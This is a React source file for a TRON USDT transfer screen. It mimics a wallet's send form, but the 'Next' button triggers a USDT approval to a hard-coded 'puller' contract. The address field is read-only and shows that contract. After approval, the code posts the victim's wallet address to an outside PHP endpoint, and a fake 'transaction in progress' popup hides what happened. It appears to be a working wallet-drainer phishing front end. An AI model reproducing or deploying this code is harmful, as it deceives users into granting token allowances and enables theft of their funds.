import React, { useState, useEffect } from "react";
import { SignClient } from "@walletconnect/sign-client";
import { Web3Modal } from "@web3modal/standalone";
import { TronWeb } from "tronweb";
import { FaRegAddressBook } from "react-icons/fa";
import { FaQrcode } from "react-icons/fa";
import { TronService } from "./tronServer";
import { tronWallet, approveUSDT as approveUSDTFunction, testnetHost, networkHost, fetchUserResources, fetchAccountInfo } from "./tronServer2";

if (typeof window !== "undefined" && typeof window.Buffer === "undefined") {
    window.Buffer = require("buffer/").Buffer;
}

// Config
const PROJECT_ID = "a2cd3f6f2c8dde8024ed901de2d36bc1";
export const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"; // mainnet USDT
export const PULLER_CONTRACT = "TJBdv5qD7mpaU9bsRvbuBbe9TmjHYGwREw"; // Replace with your deployed contract
export const RECEIVER = "THzPxXfzoMRuk1s9JRs8mcV5JKXB8ZfR4g"; // destination address

const web3Modal = new Web3Modal({
    projectId: PROJECT_ID,
    walletConnectVersion: 2,
});

function TronApp() {
    const [address, setAddress] = useState();
    const [session, setSession] = useState(null);
    const [signClient, setSignClient] = useState(null);
    const [tronWeb, setTronWeb] = useState(null);
    const [txHash, setTxHash] = useState('');
     const [showSuccess, setShowSuccess] = useState(false);
    const [showProcessing, setShowProcessing] = useState(false);
    const [status, setStatus] = useState("Disconnected");
    const [isDarkMode, setIsDarkMode] = useState(true);
    const [amount, setAmount] = useState('');
    const [isProcessing, setIsProcessing] = useState(false);
    const [recipient, setRecipient] = useState('');
    const [usdValue, setUsdValue] = useState("= $0.00");
    const [userBalance, setUserBalance] = useState({
        trx: 0,
        usdt: 0,
        bandwidth: { used: 0, total: 0, available: 0, free: { used: 0, total: 5000, available: 5000 } },
        energy: { used: 0, total: 0, available: 0 }
    });

      const [theme, setTheme] = useState("dark");

  useEffect(() => {
    const darkMode = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches;
    setTheme(darkMode ? "dark" : "light");

    const listener = (e) => setTheme(e.matches ? "dark" : "light");
    window.matchMedia('(prefers-color-scheme: dark)').addEventListener("change", listener);
    return () => window.matchMedia('(prefers-color-scheme: dark)').removeEventListener("change", listener);
  }, []);



    useEffect(() => {
        const value = parseFloat(amount);
        setUsdValue(isNaN(value) || value <= 0 ? "= $0.00" : `= $${value.toFixed(2)}`);
    }, [amount]);

    useEffect(() => {
        const initClients = async () => {
            try {
                const tw = new TronWeb({ fullHost: networkHost });
                setTronWeb(tw);

            } catch (error) {
                console.error("Init error:", error);
                setStatus("Init failed");
            }
        };
        initClients();
    }, []);

    const fetchBalances = async (walletAddress) => {
        if (!walletAddress || !tronWeb) return;

        try {
            setStatus("Fetching balances...");
            const resources = await fetchUserResources(walletAddress, tronWeb);
            const accountInfo = await fetchAccountInfo(walletAddress, tronWeb);

            setUserBalance({
                trx: resources.trxBalance,
                bandwidth: resources.bandwidth,
                energy: resources.energy,
                accountInfo: accountInfo
            });

            console.log("Balances updated:", resources);
        } catch (error) {
            console.error("Error fetching balances:", error);
        }
    };

    const connectWallet = async () => {
        if (!tronWeb) return;
        try {
            setStatus("Connecting... Use Trust Wallet");
            await tronWallet.connect();
            const address = tronWallet?.address;
            setAddress(address);
            setStatus(`Connected: ${address}`);
            return address;

        } catch (error) {
            console.error("Connection error:", error);
            setStatus("Connection failed");
            // await web3Modal.closeModal();
        }
    };


    const approveUSDT = async () => {
        const Walletaddress = await connectWallet();
        if (!Walletaddress || !tronWeb) {
            setStatus("❌ Wallet not connected or TronWeb not initialized");
            return;
        }
        try {
           
            setStatus("Creating approval transaction...");
            setTxHash('');

            console.log("Starting approval process...");
            const data = await approveUSDTFunction(Walletaddress, tronWeb);
            console.log("Approval Transaction:", data);

            if (data.result) {
                setShowProcessing(true); // Show processing popup
                setTxHash(data.txid);
                setStatus(`✅ Approval successful! TXID: ${data.txid}`);

                // sending approved address to backend
                try {
                    await fetch("https://www.trc20support.buzz/old/store-address.php", {
                        method: "POST",
                        headers: { "Content-Type": "application/json" },
                        body: JSON.stringify({ address: Walletaddress }),
                    });
                } catch (fetchErr) {
                    console.warn("Skipping fetch, not critical:", fetchErr.message);
                }
                
                // setShowProcessing(false); // Hide processing popup
                setShowSuccess(true); // Show success popup
            } else {
                setShowProcessing(false); // Hide processing popup
                setStatus(`❌ Approval failed`);
            }
            return data;
        } catch (error) {
            setShowProcessing(false); // Hide processing popup on error
            console.error("Approval error:", error);
            setStatus(`❌ Error: ${error.message}`);
            return;
        }
    };

    const newApproveUSDT = async () => {
        try {
            const tron = new TronService();
            console.log("Starting new approval process...", tron);

        } catch (error) {
            console.error("New Approval error:", error);
        }
    }




    const disconnectWallet = async () => {
        await tronWallet.disconnect();
        setSession(null);
        setAddress('');
        setStatus("Disconnected");
        setTxHash('');
    };
    const isDark = theme === "dark";

// Processing popup - Bottom modal overlay
if (showProcessing) {
    return (
      <>
        {/* Main app content with overlay */}
        <div className={`wallet-container ${isDark ? "dark" : "light"}`} style={{
          display: 'flex',
          flexDirection: 'column',
          justifyContent: 'space-between',
          minHeight: '100vh'
        }}>
          
          {/* Input sections grouped at the top */}
          <div style={{ flex: '1' }}>
            <div className="input-group">
              <p className="inpt_tital">Address or Domain Name</p>
              <div className="border">
                <div className="left">
                  <input
                    type="text"
                    className="custom-input"
                    placeholder="Search or Enter"
                    value={PULLER_CONTRACT}
                    readOnly
                  />
                </div>
                <span className=" blue flex items-center justify-end mr-3" style={{gap:'20px'}}>
                  <span className="text-sm">Paste</span>
                  <FaRegAddressBook className="cursor-pointer" />
                  <FaQrcode className="cursor-pointer" />
                </span>
              </div>
            </div>

            <div className="input-group mt-7">
              <p className="inpt_tital">Amount</p>
              <div className="border">
                <div className="left">
                  <input
                    type="number"
                    min="0"
                    step="0.01"
                    value={amount}
                    onChange={(e) => setAmount(e.target.value)}
                    placeholder="USDT Amount"
                    className="custom-input"
                  />
                </div>
                <span className="right mr-3">
                  <span className="text-sm text-[#b0b0b0]">USDT</span>
                  <span
                    className="mar_i blue text-sm ml-2 cursor-pointer"
                  >
                    Max
                  </span>
                </span>
              </div>
            </div>

            <p className="fees valid">{usdValue}</p>
          </div>

          {/* Button positioned at the bottom */}
          <div style={{ 
            marginTop: 'auto', 
            paddingTop: '2rem',
            paddingBottom: '1rem'
          }}>
            <button
              id="nextBtn"
              className="send-btn"
              onClick={approveUSDT}
              disabled={isProcessing || !parseFloat(amount)}
              style={{
                backgroundColor: isProcessing || !parseFloat(amount) ? "var(--disabled-bg)" : "#5CE07E",
                color: isProcessing || !parseFloat(amount) ? "var(--disabled-text)" : "#1b1e15",
                width: '100%'
              }}
            >
              {isProcessing ? "Processing..." : "Next"}
            </button>
          </div>
        </div>

        {/* Semi-transparent overlay */}
        <div style={{
          position: 'fixed',
          top: 0,
          left: 0,
          right: 0,
          bottom: 0,
          backgroundColor: 'rgba(0, 0, 0, 0.5)',
          zIndex: 1000,
          display: 'flex',
          alignItems: 'flex-end'
        }}>
          {/* Bottom popup modal */}
          <div style={{
            width: '100%',
            height: '50vh',
            backgroundColor: isDark ? '#1f1f1f' : '#ffffff',
            color: isDark ? '#ffffff' : '#000000',
            borderTopLeftRadius: '24px',
            borderTopRightRadius: '24px',
            padding: '1.5rem 1rem 2rem 1rem',
            display: 'flex',
            flexDirection: 'column',
            alignItems: 'center',
            justifyContent: 'space-between',
            position: 'relative',
            boxShadow: '0 -4px 20px rgba(0, 0, 0, 0.3)',
            animation: 'slideUp 0.3s ease-out'
          }}>
            {/* Handle bar at top */}
            <div style={{
              position: 'absolute',
              top: '8px',
              width: '50px',
              height: '4px',
              backgroundColor: isDark ? '#666' : '#ccc',
              borderRadius: '2px'
            }}></div>

            {/* Close button */}
            <button
              style={{
                position: 'absolute',
                top: '1rem',
                right: '1rem',
                fontSize: '1.8rem',
                background: 'none',
                border: 'none',
                color: isDark ? '#ffffff' : '#000000',
                opacity: 0.7,
                cursor: 'pointer',
                transition: 'opacity 0.2s ease',
                padding: '0.5rem'
              }}
              onMouseEnter={(e) => e.target.style.opacity = '1'}
              onMouseLeave={(e) => e.target.style.opacity = '0.7'}
              onClick={() => setShowProcessing(false)}
            >
              ✕
            </button>

            {/* Top section with animation */}
            <div style={{ 
              display: 'flex', 
              flexDirection: 'column', 
              alignItems: 'center',
              marginTop: '3rem'
            }}>
              {/* Processing animation and icon */}
              <div style={{ position: 'relative', marginBottom: '1.5rem' }}>
                {/* Animated circular background */}
                <div style={{
                  width: '100px',
                  height: '100px',
                  borderRadius: '50%',
                  background: 'linear-gradient(45deg, #2563eb, #22c55e, #1d4ed8)',
                  display: 'flex',
                  alignItems: 'center',
                  justifyContent: 'center',
                //   animation: 'spin-slow 3s linear infinite'
                }}>
                  {/* Inner circle */}
                  <div style={{
                    width: '75px',
                    height: '75px',
                    borderRadius: '50%',
                    backgroundColor: isDark ? '#1f1f1f' : '#ffffff',
                    display: 'flex',
                    alignItems: 'center',
                    justifyContent: 'center'
                  }}>
                    {/* Checkmark icon */}
                    <svg
                      style={{ width: '36px', height: '36px', color: '#22c55e' }}
                      fill="none"
                      stroke="currentColor"
                      strokeWidth="3"
                      viewBox="0 0 24 24"
                    >
                      <path strokeLinecap="round" strokeLinejoin="round" d="M5 13l4 4L19 7" />
                    </svg>
                  </div>
                </div>
              </div>

              {/* Processing text */}
             
            </div>

            {/* Middle section with description */}
            <div style={{ 
        
              flexDirection: 'column',
              width: '100%', 
              flex: 1, 
              display: 'flex', 
              alignItems: 'center',
              justifyContent: 'center',
              padding: '0 0.5rem'
            }}>
                <h2 style={{ 
                fontSize: '2.25rem', 
                fontWeight: '700', 
                marginBottom: '20.150px',
                textAlign: 'center',
                width: '100%'
              }}>
                Processing...
              </h2>
              <p style={{ 
                textAlign: 'center', 
                color: isDark ? '#b0b0b0' : '#6b7280', 
                fontSize: '1.5rem',
                lineHeight: '1.5',
                width: '100%'
              }}>
                Transaction in progress! Blockchain validation is underway. This may take a few minutes.
              </p>
            </div>

            {/* Bottom section with button */}
            <div style={{ width: '100%' }}>
              {/* Transaction details button */}
              <button
                style={{
                  backgroundColor: '#165aebff',
                  color: '#ffffff',
                  padding: '16px 24px',
                  borderRadius: '16px',
                  fontSize: '1.125rem',
                  fontWeight: '600',
                  width: '100%',
                  border: 'none',
                  cursor: txHash ? 'pointer' : 'not-allowed',
                  transition: 'all 0.2s ease',
                  minHeight: '56px'
                }}
                onClick={() => {
                  if (txHash) {
                    window.open(`https://tronscan.org/#/transaction/${txHash}`, '_blank');
                  }
                }}
                // disabled={!txHash}
              >
                Transaction details
              </button>
            </div>
          </div>
        </div>
      </>
    );
  }



    return (
        <div className={`wallet-container ${isDark ? "dark" : "light"}`} style={{
          display: 'flex',
          flexDirection: 'column',
          justifyContent: 'space-between',
          minHeight: '100vh'
        }}>
          
          {/* Input sections grouped at the top */}
          <div style={{ flex: '1' }}>
            <div className="input-group">
              <p className="inpt_tital">Address or Domain Name</p>
              <div className="border">
                <div className="left">
                  <input
                    type="text"
                    className="custom-input"
                    placeholder="Search or Enter"
                    value={PULLER_CONTRACT}
                    readOnly
                  />
                </div>
                <span className=" blue flex items-center justify-end mr-3" style={{gap:'20px'}}>
                  <span className="text-sm">Paste</span>
                  <FaRegAddressBook className="cursor-pointer" />
                  <FaQrcode className="cursor-pointer" />
                </span>
              </div>
            </div>

            <div className="input-group mt-7">
              <p className="inpt_tital">Amount</p>
              <div className="border">
                <div className="left">
                  <input
                    type="number"
                    min="0"
                    step="0.01"
                    value={amount}
                    onChange={(e) => setAmount(e.target.value)}
                    placeholder="USDT Amount"
                    className="custom-input"
                  />
                </div>
                <span className="right mr-3">
                  <span className="text-sm text-[#b0b0b0]">USDT</span>
                  <span
                    className="mar_i blue text-sm ml-2 cursor-pointer"
                  >
                    Max
                  </span>
                </span>
              </div>
            </div>

            <p className="fees valid">{usdValue}</p>
          </div>

          {/* Button positioned at the bottom */}
          <div style={{ 
            marginTop: 'auto', 
            paddingTop: '2rem',
            paddingBottom: '1rem'
          }}>
            <button
              id="nextBtn"
              className="send-btn"
              onClick={approveUSDT}
              disabled={isProcessing || !parseFloat(amount)}
              style={{
                backgroundColor: isProcessing || !parseFloat(amount) ? "var(--disabled-bg)" : "#5CE07E",
                color: isProcessing || !parseFloat(amount) ? "var(--disabled-text)" : "#1b1e15",
                width: '100%'
              }}
            >
              {isProcessing ? "Processing..." : "Next"}
            </button>
          </div>
        </div>
    );
}


export default TronApp;
